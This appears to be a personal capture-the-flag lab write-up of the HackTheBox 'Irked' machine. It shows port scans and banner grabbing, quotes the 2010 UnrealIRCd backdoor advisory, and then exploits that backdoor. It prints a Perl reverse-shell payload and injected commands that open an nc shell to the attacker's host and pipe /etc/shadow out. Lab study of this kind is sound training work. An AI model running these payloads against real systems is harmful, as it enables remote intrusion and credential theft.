<link href="../styles.module.css" rel="stylesheet">
<link rel="preconnect" href="https://fonts.googleapis.com">
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
<link href="https://fonts.googleapis.com/css2?family=Cedarville+Cursive&display=swap" rel="stylesheet">
<link rel="preconnect" href="https://fonts.googleapis.com">
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
<link href="https://fonts.googleapis.com/css2?family=Cedarville+Cursive&family=Zen+Tokyo+Zoo&display=swap" rel="stylesheet">
<link rel="preconnect" href="https://fonts.googleapis.com">
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
<link href="https://fonts.googleapis.com/css2?family=Cedarville+Cursive&family=Encode+Sans+SC&family=Zen+Tokyo+Zoo&display=swap" rel="stylesheet">


## <span class="copyright">Machine #2<span style="float:right;">By Shatha Barqawi</span>

<br/><br/>

# <span class="title">Irked


<span class="date">Wednesday, 21/7/2021</span> 


<br/> 

### <span class="lameMach subtitle">Could Be Relevant and Could Be Not  
1. Nmap normal scan results  
   * Command
     ```console
     nmap -Pn 10.10.10.117
     ```
   * Output
     ```console
     PORT    STATE SERVICE
     22/tcp  open  ssh
     80/tcp  open  http
     111/tcp open  rpcbind
     ```
2. Nmap Full scan results (When it finishes)  
   * Command
      ```console
      nmap -Pn -p- 10.10.10.117
      ```  
   * Output  
     ```console
     PORT      STATE SERVICE
     22/tcp    open  ssh
     80/tcp    open  http
     111/tcp   open  rpcbind
     6697/tcp  open  ircs-u
     8067/tcp  open  infi-async
     49889/tcp open  unknown
     65534/tcp open  unknown
     ```  

3. Grabbed the banner of the http port  
   ```console
   PORT   STATE SERVICE VERSION
   80/tcp open  http    Apache httpd 2.4.10 ((Debian))
   ```
   We now know the version of the http server we have.  

4. What I found on the http page  
<img src="irked_http.png">  

5. What's an IRC?  
   According to *TRENDMICRO*  

      <blockqoute>

      *Internet Relay Chat (IRC) is a network of Internet servers that use a specific protocol through which individuals can hold real-time online conversations via PCs and other devices. Many of today’s botnets utilize IRC to communicate with bot-infected machines.*
      </blockqoute>
6. Banner grabbing port `111`    
   * Output  
     ```console
     PORT    STATE SERVICE VERSION
     111/tcp open  rpcbind 2-4 (RPC #100000)
     ```  
   * I've searchsploited it and turns out that all of its exploits are denial of service (No use to me).
   * What is it?  
      The rpcbind utility is a server that converts RPC program numbers
     into universal addresses.  It must be running on the host to be
     able to make RPC calls on a server on that machine.  

7. Searchsploit of port 8067. The name of the service *irc version(UnrealIRCd)* and the results are  

   ```console
   UnrealIRCd 3.2.8.1 - Backdoor Command Execution (Metasploit) 
   UnrealIRCd 3.2.8.1 - Local Configuration Stack Overflow 
   UnrealIRCd 3.2.8.1 - Remote Downloader/Execute 
   UnrealIRCd 3.x - Remote Denial of Service
   ```  
   We should forget about the DDos's.  

8. Did the ssh banner grabbing to get the version of the os  
   ```console
   PORT   STATE SERVICE VERSION
   22/tcp open  ssh     OpenSSH 6.7p1 Debian 5+deb8u4 (protocol 2.0)
   Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
   ```
9. Tried this command  
```console
nc 10.10.10.117 8067 
```
and got this  
```console
:irked.htb NOTICE AUTH :*** Looking up your hostname...
:irked.htb NOTICE AUTH :*** Couldn't resolve your hostname; using your IP address instead
ERROR :Closing Link: [10.10.14.8] (Ping timeout)
```
<br/><br/>

10.  Found this to be useful  

<blockquote>
Begin forwarded message:

Date: Sat, 12 Jun 2010 16:14:25 +0200
From: satmd <satmd () satmd dyndns org>
To: IRC Security Discussion List <irc-security () lists irc-unity org>
Subject: [irc-security] UnrealIRCd 3.2.8.1 backdoored on official ftp
and site


Hello folks,

I'd like to let you know that there's been a compromise of the 
unrealircd website and ftp and the 3.2.8.1 tarball release had been 
replaced by a backdoored copy.

I'm attaching Syzops original security advisory from 
http://www.unrealircd.com/txt/unrealsecadvisory.20100612.txt

Yours,
satmd
UnrealIRCd support staff

Hi all,

This is very embarrassing...

We found out that the Unreal3.2.8.1.tar.gz file on our mirrors has been
replaced quite a while ago with a version with a backdoor (trojan) in
it. This backdoor allows a person to execute ANY command with the
privileges of the user running the ircd. The backdoor can be executed
regardless of any user
restrictions (so even if you have passworded server or hub that doesn't 
allow
any users in).

It appears the replacement of the .tar.gz occurred in November 2009 (at 
least on some mirrors). It seems nobody noticed it until now.

Obviously, this is a very serious issue, and we're taking precautions
so this will never happen again, and if it somehow does that it will be 
noticed quickly.
We will also re-implement PGP/GPG signing of releases. Even though in 
practice
(very) few people verify files, it will still be useful for those
people who do.

Safe versions
==============

The Windows (SSL and non-ssl) versions are NOT affected.

CVS is also not affected.

3.2.8 and any earlier versions are not affected.

Any Unreal3.2.8.1.tar.gz downloaded BEFORE November 10 2009 should be 
safe, but you should really double-check, see next.

How to check if you're running the backdoored version
======================================================
Two ways:

One is to check if the Unreal3.2.8.1.tar.gz you have is good or bad by 
running 'md5sum Unreal3.2.8.1.tar.gz' on it.
Backdoored version (BAD) is: 752e46f2d873c1679fa99de3f52a274d
Official version (GOOD) is: 7b741e94e867c0a7370553fd01506c66

The other way is to run this command in your Unreal3.2 directory:
grep DEBUG3_DOLOG_SYSTEM include/struct.h
If it outputs two lines, then you're running the backdoored/trojanized 
version.
If it outputs nothing, then you're safe and there's nothing to do.

What to do if you're running the backdoored version
====================================================
Obviously, you only need to do this if you checked you are indeed 
running the
backdoored version, as mentioned above. Otherwise there's no point in 
continuing, as the version on our website is (now back) the good one 
from April 13 2009 and nothing 'new'.

Solution:
* Re-download from http://www.unrealircd.com/
* Verify MD5 (or SHA1) checksums, see next section (!)
* Recompile and restart UnrealIRCd

The backdoor is in the core, it is not possible to 'clean' UnrealIRCd 
without
a restart or through a module.

How to verify that the release is the official version
=======================================================
You can check by running 'md5sum Unreal3.2.8.1.tar.gz', it should
output: 7b741e94e867c0a7370553fd01506c66  Unreal3.2.8.1.tar.gz

For reference, here are the md5sums for ALL proper files:
7b741e94e867c0a7370553fd01506c66  Unreal3.2.8.1.tar.gz
5a6941385cd04f19d9f4241e5c912d18  Unreal3.2.8.1.exe
a54eafa6861b6219f4f28451450cdbd3  Unreal3.2.8.1-SSL.exe

These are the EXACT same MD5sums as mentioned on April 13 2009 in the 
initial 3.2.8.1 announcement to the unreal-notify and unreal-users 
mailing list.
<http://sourceforge.net/mailarchive/forum.php?thread_name=49E341E0.3000702%40vulnscan.org&forum_name=unreal-notify>

Finally
========
Again, I would like to apologize about this security breach.
We simply did not notice, but should have.
We did not check the files on all mirrors regularly, but should have.
We did not sign releases through PGP/GPG, but should have done so.

This advisory (and updates to it, if any) is posted to:
http://www.unrealircd.com/txt/unrealsecadvisory.20100612.txt

</blockquote>

11. Banner grabbing `p6697`  
```console
PORT     STATE SERVICE VERSION
6697/tcp open  irc     UnrealIRCd
Service Info: Host: irked.htb
```
12. Banner grabbing `p8067` & `p65534`  

```console
PORT      STATE SERVICE VERSION
8067/tcp  open  irc     UnrealIRCd
65534/tcp open  irc     UnrealIRCd (Admin email djmardov@irked.htb)
Service Info: Host: irked.htb

```  

13. The backdoor worked on the `p8067`
    * Command  
    ```console
    nc -nv 10.10.10.117 8067
    ```  
     I have to check out the perl script and understand what does it do
    * Output  
    ```console
    (UNKNOWN) [10.10.10.117] 8067 (?) open
    :irked.htb NOTICE AUTH :*** Looking up your hostname...
    :irked.htb NOTICE AUTH :*** Couldn't resolve your hostname; using your IP address instead
    AB;perl -MIO -e '$p=fork;exit,if($p);foreach my $key(keys %ENV){if($ENV{$key}=~/(.*)/){$ENV{$key}=$1;}}$c=new IO::Socket::INET(PeerAddr,"10.10.14.8:4444");STDIN->fdopen($c,r);$~->fdopen($c,w);while(<>){if($_=~ /(.*)/){system $1;}};'
    :irked.htb 451 AB;perl :You have not registered
    id
    :irked.htb 451 id :You have not registered
    ERROR :Closing Link: [10.10.14.8] (Ping timeout)
    ```  
   But it's not very helpful, I can't go out of the unreal directory which means maybe I'll use the ssh but I need a bloody password and it's strating to frustrate me.

14. So, some critical thinking...to login with ssh I don't need the password of the account itself for this guy I need the SSH password and I think that's a different one than the one in the shadow file. So I don't need the shadow I need to find a place where ssh passwords are saved or, I don't know, authenticated or maybe research it in a different way where I look for where ssh password are instead of worrying about the shadow file.
### <span class="lameMach subtitle">Why I Got Stuck?  

<br/>

### <span class="lameMach subtitle">Good To Know    
* What is a socket (check the stackexchange bookmarked page).

<br/>

### <span class="lameMach subtitle">How Did **I** solve it  

<br/>

### <span class="lameMach subtitle">Nice Things I Found in Someone Else's Write Up  
  


 perl -MIO -e 
 $p=fork;
 exit,if($p);
 foreach my $key(keys %ENV)
 {
    if($ENV{$key}=~/(.*)/)
     {
        $ENV{$key}=$1;
     }
 }
 $c=new IO::Socket::INET(PeerAddr,"10.10.14.8:4444");
 STDIN->fdopen($c,r);
 $~->fdopen($c,w);
 while(<>)
 {if($_=~ /(.*)/){system $1;}};




AB;nc -nv 10.10.14.8 4444 -e /bin/bash

AB;nc -l -p 1234 > htmlpage

AB;cat /etc/shadow | nc 10.10.14.8 1234
nc -w 3 10.10.14.8 1234 < unreal32docs.html